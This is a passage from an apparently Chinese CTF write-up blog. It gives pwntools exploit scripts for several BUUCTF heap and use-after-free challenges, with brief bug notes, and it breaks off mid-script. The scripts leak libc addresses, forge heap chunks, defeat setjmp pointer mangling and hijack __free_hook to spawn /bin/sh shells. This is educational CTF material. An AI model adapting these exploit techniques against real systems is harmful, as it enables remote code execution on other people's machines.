class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;jmper_seccon_2016&quot;</span><br><span class="line">lib_path=&quot;&quot;</span><br><span class="line">#lib_path=&quot;/home/zhou/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">#parm=[elf_path,&quot;127.0.0.1&quot;,&quot;3339&quot;]</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">if lib_path:</span><br><span class="line">    libc = ELF(f&quot;&#123;lib_path&#125;/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port = 26167</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    if lib_path:</span><br><span class="line">        io = process(parm,env= &#123;&#x27;LD_LIBRARY_PATH&#x27;: lib_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *0x400884</span><br><span class="line">    c</span><br><span class="line">    x/20xg *0x602030</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.close()</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *0x400884</span><br><span class="line">    c</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    io=gdb.debug(parm, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add():</span><br><span class="line">    sla(b&quot;6. Bye :)\n&quot;,b&quot;1&quot;)</span><br><span class="line"></span><br><span class="line"># def free(idx):</span><br><span class="line">#     sla(b&quot;Choice:\n&quot;,b&quot;3&quot;)</span><br><span class="line">#     sla(b&quot;Input the user id:\n&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show_name(idx):</span><br><span class="line">    sla(b&quot;6. Bye :)\n&quot;,b&quot;4&quot;)</span><br><span class="line">    sla(b&quot;ID:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sla(b&quot;6. Bye :)\n&quot;,b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;ID:&quot;,str(idx))</span><br><span class="line">    sa(b&quot;Input name:&quot;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#溢出，可以修改堆指针</span><br><span class="line">def write(idx,content):</span><br><span class="line">    sla(b&quot;6. Bye :)\n&quot;,b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;ID:&quot;,str(idx))</span><br><span class="line">    sa(b&quot;Input memo:&quot;,content)</span><br><span class="line"></span><br><span class="line">def show_mem(idx):</span><br><span class="line">    sla(b&quot;6. Bye :)\n&quot;,b&quot;5&quot;)</span><br><span class="line">    sla(b&quot;ID:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def rol(val,k):</span><br><span class="line">    s=bin(val)[2:]</span><br><span class="line">    return int(s[k:]+s[:k],2)</span><br><span class="line">def ror(val,k):</span><br><span class="line">    s=bin(val)[2:]</span><br><span class="line">    return int(s[-k:]+s[:len(s)-k],2)</span><br><span class="line"># def convert_str_asmencode(content: str):</span><br><span class="line">#     out = &quot;&quot;</span><br><span class="line">#     for i in content:</span><br><span class="line">#         out = hex(ord(i))[2:] + out</span><br><span class="line">#     out = &quot;0x&quot; + out</span><br><span class="line">#     return out</span><br><span class="line"></span><br><span class="line">#debug_force()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">write(0,b&quot;a&quot;*32+b&quot;\x00&quot;)</span><br><span class="line">edit(0,b&quot;a&quot;*8+p64(elf.got[&quot;puts&quot;])+b&quot;\n&quot;)</span><br><span class="line">show_name(0)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))-libc.sym[&quot;puts&quot;]</span><br><span class="line">add()</span><br><span class="line">write(1,b&quot;a&quot;*32+b&quot;\x70&quot;)</span><br><span class="line">edit(1,b&quot;a&quot;*8+p64(0x602038)+b&quot;\n&quot;)</span><br><span class="line">show_name(1)</span><br><span class="line">jmpbuf=u64(rud(b&quot;1.&quot;).ljust(8,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">write(3,b&quot;a&quot;*32+b&quot;\x50&quot;)</span><br><span class="line">edit(3,b&quot;a&quot;*8+p64(jmpbuf+0x38)+b&quot;\n&quot;)</span><br><span class="line">show_name(3)</span><br><span class="line">secret_val=u64(r(8))</span><br><span class="line">secret=ror(secret_val,0x11)^0x400C31</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">target_val=rol(system_addr^secret,0x11)</span><br><span class="line">add()</span><br><span class="line">write(4,b&quot;a&quot;*32+b&quot;\xc0&quot;)</span><br><span class="line">edit(4,b&quot;a&quot;*8+p64(jmpbuf+0x38)+b&quot;\n&quot;)</span><br><span class="line">edit(4,p64(target_val)+b&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">write(5,b&quot;a&quot;*32+b&quot;\x30&quot;)</span><br><span class="line">edit(5,b&quot;a&quot;*8+p64(jmpbuf)+b&quot;\n&quot;)</span><br><span class="line">edit(5,b&quot;/bin/sh\n&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(25):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="wdb-2018-2nd-Fgo"><a href="#wdb-2018-2nd-Fgo" class="headerlink" title="wdb_2018_2nd_Fgo"></a>wdb_2018_2nd_Fgo</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wdb_2018_2nd_Fgo">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./wdb_2018_2nd_Fgo&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29192</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/6xw 0x804B050</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;the size of servant&#x27;s name : \n&quot;</span>,str(size))</span><br><span class="line">    sa(b<span class="string">&quot;ability : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index : \n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index :&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">backdoor=<span class="number">0x8048956</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-echo2"><a href="#pwnable-echo2" class="headerlink" title="pwnable_echo2"></a>pwnable_echo2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_echo2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>easy uaf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;name? : &quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line">sl(b<span class="string">&quot;%7$p&quot;</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(rld(), <span class="number">16</span>) - libc.sym[<span class="string">&quot;puts&quot;</span>] - <span class="number">362</span></span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;exit? (y/n)&quot;</span>, b<span class="string">&quot;n&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">s(b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + b<span class="string">&quot;b&quot;</span> * <span class="number">0x8</span> + p64(libc_base + one_gadget[<span class="number">2</span>]))</span><br><span class="line">sla(b<span class="string">&quot;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="isitdtu2019-iz-heap-lv1"><a href="#isitdtu2019-iz-heap-lv1" class="headerlink" title="isitdtu2019_iz_heap_lv1"></a>isitdtu2019_iz_heap_lv1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#isitdtu2019_iz_heap_lv1">BUUCTF在线评测</a></p>
<p>比较巧妙的一道题目，漏洞出现在free函数，里面数组小标越界了，由于可以控制的bss碍着保存堆地址，所以我们可以在bss里面伪造堆地址达到uaf的效果</p>
<p>同时注意</p>
<p>tcache不会检查周围的堆块</p>
<p>unsorted bin会检查当前的prev_inuse,后面一块的size,以及后后一块的prev_inuse</p>
<p>所以最方便的伪造就是</p>
<p>当前unsorted bin,下一个完整的块，加上一个p8(1)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./iz_heap_lv1&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25360</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/30xg 0x602060</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">0</span>~<span class="number">128</span></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Enter data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;input your data\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;edit: (Y/N)&quot;</span>, b<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Input name: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;nput name: &quot;</span>,</span><br><span class="line">    p64(<span class="number">0x602120</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    + p64(<span class="number">0x91</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">17</span></span><br><span class="line">    + p64(<span class="number">0x21</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    + p8(<span class="number">1</span>),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x88</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">20</span>)</span><br><span class="line">show(b<span class="string">&quot;a&quot;</span> * <span class="number">0x1F</span> + b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FF55066ECA0</span> + <span class="number">0x7FF550283000</span></span><br><span class="line"></span><br><span class="line">show(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">add(<span class="number">0x78</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(p64(<span class="number">0x602120</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">20</span>)</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">show(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(free_hook_addr))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_document">BUUCTF在线评测</a></p>
<p>其实题目总体还好,不算特别复杂，就是free后指针没有清零，泄露libc方式也比较直接</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./gyctf_2020_document&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">27702</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/6xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">4096</span> 无洞</span><br><span class="line">def add(name: bytes, sex: bytes, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice : \n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;name\n&quot;</span>, name)</span><br><span class="line">    sa(b<span class="string">&quot;sex\n&quot;</span>, sex)</span><br><span class="line">    sa(b<span class="string">&quot;information\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice : \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;change sex?\n&quot;</span>, b<span class="string">&quot;n&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;information\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 没有清空</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice : \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice : \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span> * <span class="number">8</span>, b<span class="string">&quot;1&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">112</span>)  # <span class="number">0</span></span><br><span class="line">add(b<span class="string">&quot;/bin/sh\0&quot;</span>, b<span 